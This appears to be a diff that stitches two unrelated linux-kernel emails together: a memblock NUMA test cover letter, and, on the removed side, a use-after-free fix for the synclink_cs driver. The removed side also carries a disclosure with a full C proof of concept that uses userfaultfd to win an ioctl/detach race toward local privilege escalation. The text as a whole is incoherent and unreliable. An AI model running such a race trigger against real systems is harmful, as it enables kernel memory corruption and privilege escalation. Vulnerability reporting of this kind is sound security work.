@@ -2,473 +2,192 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id BC9F35B6741
-	for <lists+linux-kernel@lfdr.de>; Tue, 13 Sep 2022 07:20:34 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id DB3BD5B6742
+	for <lists+linux-kernel@lfdr.de>; Tue, 13 Sep 2022 07:21:37 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S229804AbiIMFUa (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Tue, 13 Sep 2022 01:20:30 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:56648 "EHLO
+        id S229915AbiIMFVd (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Tue, 13 Sep 2022 01:21:33 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:57046 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229597AbiIMFU1 (ORCPT
+        with ESMTP id S229597AbiIMFVb (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Tue, 13 Sep 2022 01:20:27 -0400
-Received: from mail-pj1-x102a.google.com (mail-pj1-x102a.google.com [IPv6:2607:f8b0:4864:20::102a])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id ACD004DF17
-        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:20:25 -0700 (PDT)
-Received: by mail-pj1-x102a.google.com with SMTP id m3so10166274pjo.1
-        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:20:25 -0700 (PDT)
+        Tue, 13 Sep 2022 01:21:31 -0400
+Received: from mail-qt1-x842.google.com (mail-qt1-x842.google.com [IPv6:2607:f8b0:4864:20::842])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 5B3954DF17
+        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:21:29 -0700 (PDT)
+Received: by mail-qt1-x842.google.com with SMTP id w2so4234223qtv.9
+        for <linux-kernel@vger.kernel.org>; Mon, 12 Sep 2022 22:21:29 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=gmail.com; s=20210112;
-        h=content-disposition:mime-version:message-id:subject:cc:to:from:date
-         :from:to:cc:subject:date;
-        bh=d8BqwxCGc+kXQ1e7xluf36X8/bgdZP+Eoc81d6aXuy4=;
-        b=ofT4fVigZr+7fMiBAH41MqqVG/1seC7x27jqQ8PVBYpB2wxuWsBL4MrunlTbeSa1eo
-         pvl2Y+ffYXAqM6xyLRoMO7IdS/AUYerQ/+SapiNxAstSSlx7SaowKurrXTe2ZSIpF0xD
-         ag+dlUxHgEU+pk3ZDaqiEhvv4dLsRaVwierXfVwRjUa3o6UZxPzUTedSw9GklUzxVlUt
-         thzh09yI5Wbl7QmSPJexnpNg7+7mhS+INWXQAHqSODLK0/kvN1efNSkrbELZTe6vGKcb
-         szBzI22oa9xLZREXwHcWrqgAkMfoQfmS3o8WyUqGsbHFJoRzPbeoMF2FQeT51j3PL8FA
-         2/cA==
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date;
+        bh=62h1MAuVwSbDjXD0anEf/eJ0jHXwRdLYrtgnbPgF46c=;
+        b=PHLM5nNHcw/mZE3RfBdcDO078m4ywJx+nGSQgee8Wpum/WvcDe7TTI2RFaG5GK8mWP
+         mN0+oXW1TWJGxAcJM681w1dgcSGrt0EpXHEp2nml9ryloG83BRFZyeChUWuJpCkMwoae
+         b+f6IBKmleMb4zdI8qTbpaZfAMsAUqmmwRZVWJs0Go/fkThNytTv6T7ad2lsWKDlbdNG
+         1apYxz3r/wi+AQJ/vI/Bbs5A5EsVtIvxieDF6ACfbB/hiOUkmrH/cH6p19RLckDESwEV
+         4/5dDJlI6rFq0oGIfVT/RC/hTs8dl2KDQSnwhwSGlx8iDvt4397zabEAv/wnnGSt5Mb2
+         0aNg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20210112;
-        h=content-disposition:mime-version:message-id:subject:cc:to:from:date
-         :x-gm-message-state:from:to:cc:subject:date;
-        bh=d8BqwxCGc+kXQ1e7xluf36X8/bgdZP+Eoc81d6aXuy4=;
-        b=PwGgS8IDkSMvCMsbnRRjsZSKiKWqh2fe5W1jplbBDGOO1e+7S6G5/gtQQGJnE+RlUu
-         QoaiE7PdaIE3i5e7ove8xdPB7Knhfg3iFqlf5+8OzuI/MPljfPo1u5Qk5oIrPPQoswuF
-         0n6BBmWfUmMRT5A4R+aY3G+82B6Vf2kmBfPIAXUq5/+fEtLRMW7XRVMDWhWEQJn0q15r
-         75XhWUhhQr0fFr0u3h+6Oax3Kn1ZleAtHl/kU5iys0yAPKrtMOacOgjpVuIrQjo7FTwU
-         zTtVR5CLrlS4INKei0MOI4BIH3E24ZiXsUaLzAUTFj1ix+Q2hFDpISqSnOSLjBAvRkRU
-         qNFQ==
-X-Gm-Message-State: ACgBeo2jOv6Utro57gezt1o1TRDHZij0biJSt9U+hbrx8PaKlWGHSpsn
-        43nYGH7gibvJvwd70TQCA7A=
-X-Google-Smtp-Source: AA6agR4OFdES3kwD6rimFqvsTjUhccvM7pRHy7ypddRBWcbnNv3rilCmxgQyk6L3hSzmyKT9y20S1A==
-X-Received: by 2002:a17:902:f541:b0:176:e8f1:cd57 with SMTP id h1-20020a170902f54100b00176e8f1cd57mr28903925plf.8.1663046424923;
-        Mon, 12 Sep 2022 22:20:24 -0700 (PDT)
-Received: from ubuntu ([175.124.254.119])
-        by smtp.gmail.com with ESMTPSA id j3-20020a170902da8300b001714e7608fdsm7150577plx.256.2022.09.12.22.20.22
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-message-state:from:to:cc:subject:date;
+        bh=62h1MAuVwSbDjXD0anEf/eJ0jHXwRdLYrtgnbPgF46c=;
+        b=C5tGQMNVYIllb2hgcZQg83IkDjQHSDm9C27oBEu68JkAjj/Rf4Do+2KIehaDNaLJsQ
+         lA+bv1FnkkHYtz26H21C2SE481yKbdwUq0ELQjw9POkDWH1Z/bGk/Nhq7i3kE64QSUFj
+         ROAvZRI614sBo2eUa0EOdWg8hq5vqC/AgaiOmTHTV0H7KsMAfPcxwXf68JVmMl0iM8Qc
+         f/+N2hDOg/dfR6zHV009TTH2K130LcP2x0RTARIJpxLPMF/bdSMNKhLil5Es+leHsSme
+         t/NH1jcWEn3Uk2iC0JEq7dhrHa1cGj50hce0OjvvGa4iBe80FOf0soBZakZUFg1WmBnZ
+         XxTQ==
+X-Gm-Message-State: ACgBeo2M8n58lPkG/Djrp4/xW0lLL44tE73woioU/H6EnmycTlnOCKn4
+        LrRNGJixDh7Gz5iIIJAHap+04hPomxI=
+X-Google-Smtp-Source: AA6agR4ETJJpeh0g20GjLpaXbfz2QyHtazk7T7p9YBS7fImF4XKNuTMVTUMx6C1nxc1Iy1Kktm7NtA==
+X-Received: by 2002:ac8:5f82:0:b0:35b:b35e:74ff with SMTP id j2-20020ac85f82000000b0035bb35e74ffmr7485496qta.574.1663046488454;
+        Mon, 12 Sep 2022 22:21:28 -0700 (PDT)
+Received: from sophie ([45.134.140.166])
+        by smtp.gmail.com with ESMTPSA id k20-20020a05620a415400b006c479acd82fsm9376839qko.7.2022.09.12.22.21.26
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 12 Sep 2022 22:20:24 -0700 (PDT)
-Date:   Mon, 12 Sep 2022 22:20:20 -0700
-From:   Hyunwoo Kim <imv4bel@gmail.com>
-To:     arnd@arndb.de, gregkh@linuxfoundation.org,
-        ilpo.jarvinen@linux.intel.com
-Cc:     linux-kernel@vger.kernel.org, imv4bel@gmail.com
-Subject: [PATCH] pcmcia: synclink_cs: Fix use-after-free in mgslpc_ioctl()
-Message-ID: <20220913052020.GA85241@ubuntu>
+        Mon, 12 Sep 2022 22:21:27 -0700 (PDT)
+From:   Rebecca Mckeever <remckee0@gmail.com>
+To:     Mike Rapoport <rppt@kernel.org>, linux-mm@kvack.org,
+        linux-kernel@vger.kernel.org
+Cc:     David Hildenbrand <david@redhat.com>,
+        Rebecca Mckeever <remckee0@gmail.com>
+Subject: [PATCH v6 0/4] memblock tests: add NUMA tests for memblock_alloc_try_nid*
+Date:   Tue, 13 Sep 2022 00:21:08 -0500
+Message-Id: <cover.1663046060.git.remckee0@gmail.com>
+X-Mailer: git-send-email 2.25.1
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-X-Spam-Status: No, score=-2.1 required=5.0 tests=BAYES_00,DKIM_SIGNED,
-        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_FROM,
-        RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,T_SCC_BODY_TEXT_LINE
-        autolearn=ham autolearn_force=no version=3.4.6
+Content-Transfer-Encoding: 8bit
+X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_ENVFROM_END_DIGIT,
+        FREEMAIL_FROM,RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,
+        T_SCC_BODY_TEXT_LINE autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-A race condition may occur if the user physically removes
-the pcmcia device while calling ioctl() for this tty device node.
+These patches add additional tests for memblock_alloc_try_nid() and
+memblock_alloc_try_nid_raw() that use a simulated physical
+memory that is set up with multiple NUMA nodes. Additionally, most of
+these tests set nid != NUMA_NO_NODE.
 
-This is a race condition between the mgslpc_ioctl() function and
-the mgslpc_detach() function, which may eventually result in UAF.
+To set up a simulated physical memory with multiple NUMA nodes, patch 1
+introduces setup_numa_memblock(). This function uses a previously
+allocated dummy physical memory. It can be used in place of
+setup_memblock() in tests that need to simulate a NUMA system.
 
-So, add a refcount check to mgslpc_detach() to free the structure
-after the tty device node is close()d.
+These tests are run twice, once for memblock_alloc_try_nid() and once
+for memblock_alloc_try_nid_raw(), so that both functions are tested with
+the same set of tests. When the tests run memblock_alloc_try_nid(), they
+test that the entire memory region is zero. When the tests run
+memblock_alloc_try_nid_raw(), they test that the entire memory region is
+nonzero.
 
-Signed-off-by: Hyunwoo Kim <imv4bel@gmail.com>
 ---
- drivers/char/pcmcia/synclink_cs.c | 29 +++++++++++++++++++++++++----
- 1 file changed, 25 insertions(+), 4 deletions(-)
+Changelog
 
-diff --git a/drivers/char/pcmcia/synclink_cs.c b/drivers/char/pcmcia/synclink_cs.c
-index 8fc49b038372..cf0cb3d7a69c 100644
---- a/drivers/char/pcmcia/synclink_cs.c
-+++ b/drivers/char/pcmcia/synclink_cs.c
-@@ -216,7 +216,8 @@ typedef struct _mgslpc_info {
- 
- 	/* PCMCIA support */
- 	struct pcmcia_device	*p_dev;
--	int		      stop;
-+	int			stop;
-+	struct kref		refcnt;
- 
- 	/* SPPP/Cisco HDLC device parts */
- 	int netcount;
-@@ -468,10 +469,21 @@ static void mgslpc_wait_until_sent(struct tty_struct *tty, int timeout);
- 
- /* PCMCIA prototypes */
- 
-+static void mgslpc_delete(struct kref *kref);
- static int mgslpc_config(struct pcmcia_device *link);
- static void mgslpc_release(u_long arg);
- static void mgslpc_detach(struct pcmcia_device *p_dev);
- 
-+static void mgslpc_delete(struct kref *kref)
-+{
-+	MGSLPC_INFO *info = container_of(kref, MGSLPC_INFO, refcnt);
-+	struct pcmcia_device *link = info->p_dev;
-+
-+	mgslpc_release((u_long)link);
-+
-+	mgslpc_remove_device(info);
-+}
-+
- /*
-  * 1st function defined in .text section. Calling this function in
-  * init_module() followed by a breakpoint allows a remote debugger
-@@ -534,6 +546,7 @@ static int mgslpc_probe(struct pcmcia_device *link)
- 	init_waitqueue_head(&info->event_wait_q);
- 	spin_lock_init(&info->lock);
- 	spin_lock_init(&info->netlock);
-+	kref_init(&info->refcnt);
- 	memcpy(&info->params,&default_params,sizeof(MGSL_PARAMS));
- 	info->idle_mode = HDLC_TXIDLE_FLAGS;
- 	info->imra_value = 0xffff;
-@@ -620,13 +633,14 @@ static void mgslpc_release(u_long arg)
- 
- static void mgslpc_detach(struct pcmcia_device *link)
- {
-+	MGSLPC_INFO *info = link->priv;
-+
- 	if (debug_level >= DEBUG_LEVEL_INFO)
- 		printk("mgslpc_detach(0x%p)\n", link);
- 
--	((MGSLPC_INFO *)link->priv)->stop = 1;
--	mgslpc_release((u_long)link);
-+	info->stop = 1;
- 
--	mgslpc_remove_device((MGSLPC_INFO *)link->priv);
-+	kref_put(&info->refcnt, mgslpc_delete);
- }
- 
- static int mgslpc_suspend(struct pcmcia_device *link)
-@@ -2341,10 +2355,13 @@ static void mgslpc_close(struct tty_struct *tty, struct file * filp)
- 	
- 	tty_port_close_end(port, tty);
- 	tty_port_tty_set(port, NULL);
-+
- cleanup:
- 	if (debug_level >= DEBUG_LEVEL_INFO)
- 		printk("%s(%d):mgslpc_close(%s) exit, count=%d\n", __FILE__, __LINE__,
- 			tty->driver->name, port->count);
-+
-+	kref_put(&info->refcnt, mgslpc_delete);
- }
- 
- /* Wait until the transmitter is empty.
-@@ -2480,6 +2497,8 @@ static int mgslpc_open(struct tty_struct *tty, struct file * filp)
- 	if (mgslpc_paranoia_check(info, tty->name, "mgslpc_open"))
- 		return -ENODEV;
- 
-+	kref_get(&info->refcnt);
-+
- 	port = &info->port;
- 	tty->driver_data = info;
- 	tty_port_tty_set(port, tty);
-@@ -2520,6 +2539,8 @@ static int mgslpc_open(struct tty_struct *tty, struct file * filp)
- 	retval = 0;
- 
- cleanup:
-+	kref_put(&info->refcnt, mgslpc_delete);
-+
- 	return retval;
- }
- 
+v5 -> v6
+Based on feedback from David Hildenbrand:
+PATCH 1:
+- tests/common.c, tests/common.h:
+    + setup_numa_memblock():
+        * Change nodes[] from const int to const unsigned int
+        * Remove "&& node_fracs[i] > 0" from the assert()
+PATCH 2:
+- tests/alloc_nid_api.c:
+    + Update node_fractions[] type to static const unsigned int to
+      reflect changes in PATCH 1
+
+v4 -> v5
+Based on feedback from David Hildenbrand:
+PATCH 1:
+- tests/common.c:
+    + setup_numa_memblock():
+        * Change nodes[] to int basis points (one hundredth of 1% or
+          1/10000) instead of phys_addr_t fraction denominators
+        * Rename parameter nodes[] to node_fracs[]
+PATCH 2:
+- tests/alloc_nid_api.c:
+    + Update node_fractions[] to reflect changes in PATCH 1
+
+v3 -> v4
+Based on feedback from David Hildenbrand:
+PATCH 1:
+- tests/common.h:
+    + Remove #define MEM_FACTOR
+PATCH 2:
+- tests/alloc_nid_api.c:
+    + Add missing blank line after alloc_nid_test_flags = flags;
+PATCH 2, PATCH 3, PATCH 4:
+- tests/alloc_nid_api.c:
+    + Define variables in new tests in a single block
+    + Change "cleared memory region" to "memory region" in comment
+      blocks for new tests
+
+Based on feedback from Mike Rapoport:
+PATCH 1:
+- tests/common.c:
+    + Remove node_sizes[] array
+- tests/common.c, tests/common.h:
+    + Combine setup_numa_memblock_generic() and setup_numa_memblock():
+        * Remove setup_numa_memblock(void)
+        * Change setup_numa_memblock_generic() to setup_numa_memblock()
+          and remove the factor and node_cnt parameters
+        * Change nodes[] parameter to an array containing the
+        * denominators
+          of the fractions of MEM_SIZE contained in each node
+          e.g., if nodes[0] = SZ_8, node 0 will contain 1/8th of
+MEM_SIZE    
+PATCH 2:
+- tests/alloc_nid_api.c:
+    + Add node_fractions[] array:
+        * Based on values from node_sizes[] array previously in PATCH 1
+        * Update to fit the new nodes[] parameter of
+        * setup_numa_memblock()
+
+v2 -> v3
+PATCH 2, PATCH 3, PATCH 4:
+- tests/alloc_nid_api.c:
+    + Edits for consistency between tests and test naming styles:
+        * Change "numa_top_down" to "top_down_numa"
+        * Change "numa_bottom_up" to "bottom_up_numa"
+        * Move "generic" to immediately before "check"
+        * alloc_try_nid_bottom_up_numa_small_node_check() and
+          alloc_try_nid_bottom_up_numa_node_reserved_check():
+            - Separate size definition from its declaration
+
+Updates based on changes to the dependent patch set noted above:
+PATCH 2, PATCH 3, PATCH 4:
+- tests/alloc_nid_api.c:
+    + get_func_testing():
+        * Rename to get_memblock_alloc_try_nid_name().
+    + Update calls to verify_mem_content() to assert_mem_content().
+
+v1 -> v2
+Updates based on changes to the dependent patch set noted above:
+PATCH 2, PATCH 3, PATCH 4:
+- tests/alloc_nid_api.c:
+    + Update calls to verify_mem_content() to include the flags parameter
+      required by the new, common verify_mem_content() function.
+---
+
+Rebecca Mckeever (4):
+  memblock tests: add simulation of physical memory with multiple NUMA
+    nodes
+  memblock tests: add top-down NUMA tests for memblock_alloc_try_nid*
+  memblock tests: add bottom-up NUMA tests for memblock_alloc_try_nid*
+  memblock tests: add generic NUMA tests for memblock_alloc_try_nid*
+
+ .../testing/memblock/scripts/Makefile.include |    2 +-
+ tools/testing/memblock/tests/alloc_nid_api.c  | 1466 ++++++++++++++++-
+ tools/testing/memblock/tests/alloc_nid_api.h  |   16 +
+ tools/testing/memblock/tests/common.c         |   31 +
+ tools/testing/memblock/tests/common.h         |   22 +-
+ 5 files changed, 1524 insertions(+), 13 deletions(-)
+
 -- 
 2.25.1
 
-
-Dear all,
-
-I think I've probably found a race-condition-to-UAF vulnerability in
-drivers/char/pcmcia/synclink_cs.c.
-However, this device driver is a pcmcia_driver based driver.
-I haven't been able to get this old pcmcia adapter/device.
-
-If you don't mind, I'd like to ask the Linux kernel community to test if
-this vulnerability actually triggers.
-
-
-# Introduction
-This vulnerability occurs in drivers/char/pcmcia/synclink_cs.c.
-
-The cause of the vulnerability is a race condition between mgslpc_ioctl() and mgslpc_detach().
-
-The attack vector is the "/dev/ttySLP0" device node.
-And this device node becomes 0660 permission belonging to the dialout group due
-to the following udev rules in Ubuntu etc:
-```
-50-udev-default.rules:25:KERNEL=="tty[A-Z]*[0-9]|ttymxc[0-9]*|pppox[0-9]*|ircomm[0-9]*|noz[0-9]*|rfcomm[0-9]*", GROUP="dialout"
-```
-This means that if this vulnerability actually occurs, a user belonging to the "dialout"
-group could use this UAF read/write vulnerability as an LPE.
-
-
-# Vulnerability
-This race condition occurs between this driver's tty_operations - mgslpc_ioctl()
-and pcmcia_driver - mgslpc_detach():
-```
-                cpu0                                                cpu1
-       1. tty_ioctl()
-          mgslpc_ioctl()
-          get_stats()
-          COPY_TO_USER()  <- userfaultfd set
-                                                             2. mgslpc_detach()
-                                                                mgslpc_remove_device()
-                                                                kfree(info)
-       3. COPY_TO_USER()  <- userfaultfd release, UAF
-```
-
-1. Call ioctl() in the thread that open()ed ttySLP0.
-It stops at COPY_TO_USER() in get_stats() because you pass the userfaultfd(or FUSEfs)
-set userspace address when calling ioctl().
-
-2. Physically remove the PCMCIA device.
-In this case, the pcmcia_driver's .remove callback, mgslpc_detach() is called
-and "kfree(info);" is executed.
-Here this "info" structure is the target of a UAF attack.
-
-3. Release userfaultfd from the thread that called ioctl().
-A UAF occurs that copies the freed info structure's value to the user.
-Also, since UAF occurs in all cases of mgslpc_ioctl(), it can be used for LPE.
-
-
-The test code is:
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <unistd.h>
-#include <string.h>
-#include <fcntl.h>
-#include <pthread.h>
-#include <errno.h>
-#include <sched.h>
-#include <malloc.h>
-#include <poll.h>
-#include <pty.h>
-#include <sys/syscall.h>
-#include <sys/ioctl.h>
-#include <sys/wait.h>
-#include <sys/mman.h>
-#include <sys/socket.h>
-#include <sys/ipc.h>
-#include <linux/userfaultfd.h>
-
-#include <linux/synclink.h>
-
-
-#define CPU_0 1
-#define CPU_1 2
-#define CPU_2 3
-#define CPU_3 4
-#define UFFD_COUNT 1
-
-#define die() do { \
-	fprintf(stderr, "died in %s: %u\\n", __func__, __LINE__); \
-	exit(EXIT_FAILURE); \
-} while (0)
-
-
-int fd;
-int page_size;
-int set1 = 0;
-char *addr;
-
-
-void set_affinity(unsigned long mask) {
-	if (pthread_setaffinity_np(pthread_self(), sizeof(mask), (cpu_set_t *)&mask) < 0) {
-		perror("pthread_setaffinity_np");
-	}
-
-	return;
-}
-
-static void *fault_handler_thread(void *arg) {
-	static struct uffd_msg msg;
-	long uffd;
-	static char *page = NULL;
-	struct uffdio_copy uffdio_copy;
-	ssize_t nwrite;
-	int qid;
-	uintptr_t fault_addr;
-
-	uffd = (long)arg;
-
-	if (page == NULL) {
-		page = mmap(NULL, page_size,
-				PROT_READ | PROT_WRITE,
-				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-		if (page == MAP_FAILED){
-			perror("mmap");
-			die();
-		}
-	}
-
-	for (;;) {
-		struct pollfd pollfd;
-		int nwritey;
-		pollfd.fd = uffd;
-		pollfd.events = POLLIN;
-		nwritey = poll(&pollfd, 1, -1);
-		if (nwritey == -1) {
-			perror("poll");
-			die();
-		}
-
-		nwrite = read(uffd, &msg, sizeof(msg));
-		if (nwrite == 0) {
-			printf("EOF on userfaultfd!\n");
-			die();
-		}
-
-		if (nwrite == -1) {
-			perror("write");
-			die();
-		}
-
-		if (msg.event != UFFD_EVENT_PAGEFAULT) {
-			perror("Unexpected event on userfaultfd");
-			die();
-		}
-
-		fault_addr = msg.arg.pagefault.address;
-
-		if (fault_addr == (uintptr_t)addr) {
-
-			printf("[step 3] ioctl ufd stuck  pid : %ld\n", syscall(SYS_gettid));
-
-			while(!set1);
-
-			memset(page, 0x42, page_size);
-
-			uffdio_copy.src = (unsigned long)page;
-			uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
-			uffdio_copy.len = page_size;
-			uffdio_copy.mode = 0;
-			uffdio_copy.copy = 0;
-			if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
-				perror("fault_handler_thwrite() - ioctl-UFFDIO_COPY case 1");
-				die();
-			}
-		}
-	}
-}
-
-void set_userfaultfd(void) {
-	long uffd[UFFD_COUNT];
-	struct uffdio_api uffdio_api[UFFD_COUNT];
-	struct uffdio_register uffdio_register;
-	pthread_t pf_hdr[UFFD_COUNT];
-	int p[UFFD_COUNT];
-	unsigned int size;
-
-	page_size = sysconf(_SC_PAGE_SIZE);
-	size = page_size;
-
-	addr = (char *)mmap(NULL,
-			page_size * UFFD_COUNT,
-			PROT_READ | PROT_WRITE,
-			MAP_PRIVATE | MAP_ANONYMOUS,
-			-1, 0);
-
-	/*   userfaultfd handler thwrites   */
-	for (int i=0; i<UFFD_COUNT; i++) {
-		uffd[i] = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-		if (uffd[i] == -1) {
-			perror("syscall : userfaultfd");
-			die();
-		}
-
-		uffdio_api[i].api = UFFD_API;
-		uffdio_api[i].features = 0;
-		if (ioctl(uffd[i], UFFDIO_API, &uffdio_api[i]) == -1) {
-			perror("ioctl() : UFFDIO_API");
-			die();
-		}
-
-		uffdio_register.range.start = (unsigned long)(addr + (page_size * i));
-		uffdio_register.range.len   = size;
-		uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
-		if (ioctl(uffd[i], UFFDIO_REGISTER, &uffdio_register) == -1) {
-			perror("ioctl() : UFFDIO_REGISTER");
-			die();
-		}
-
-		p[i] = pthread_create(&pf_hdr[i], NULL, fault_handler_thread, (void *)uffd[i]);
-		if (p[i] != 0) {
-			perror("pthread_create : page_fault_handler_thread");
-			die();
-		}
-	}
-}
-
-void *synclink_ioctl(void) {
-	int ret;
-
-	printf("[step 2] ioctl before  pid : %ld\n", syscall(SYS_gettid));
-
-	ret = ioctl(fd, MGSL_IOCGSTATS, addr);
-
-	printf("[step 5] ioctl after ret : %d  pid : %ld\n", ret, syscall(SYS_gettid));
-}
-
-void *synclink_remove(void) {
-	int ret;
-	char input[2];
-
-	sleep(5);
-
-	printf("Disconnect now (After disconnecting, type enter)\n");
-	read(0, input, 1);
-	printf("[step 4] disconnect pcmcia device\n");
-
-	sleep(5);
-
-	/*
-	 *
-	 * allocate a victim structure
-	 *
-	 */
-
-	set1 = 1;
-}
-
-int main() {
-	int p1, p2;
-	int status1, status2;
-	pthread_t hdr1, hdr2;
-
-	set_userfaultfd();
-
-	fd = open("/dev/ttySLP0", O_RDWR);
-	printf("[step 1] open fd = %d  pid : %ld\n", fd, syscall(SYS_gettid));
-
-	p1 = pthread_create(&hdr1, NULL, synclink_ioctl, (void *)NULL);
-	if (p1 != 0) {
-		perror("pthread_create 1");
-		die();
-	}
-
-	p2 = pthread_create(&hdr2, NULL, synclink_remove, (void *)NULL);
-	if (p2 != 0) {
-		perror("pthread_create 2");
-		die();
-	}
-
-	pthread_join(hdr1, (void **)&status1);
-	pthread_join(hdr2, (void **)&status2);
-
-	printf("done  pid : %ld\n", syscall(SYS_gettid));
-
-	return 0;
-}
-```
-
-If the vulnerability is actually triggered, applying the sent patch will fix it.
-
-Best Regards,
-Hyunwoo Kim.
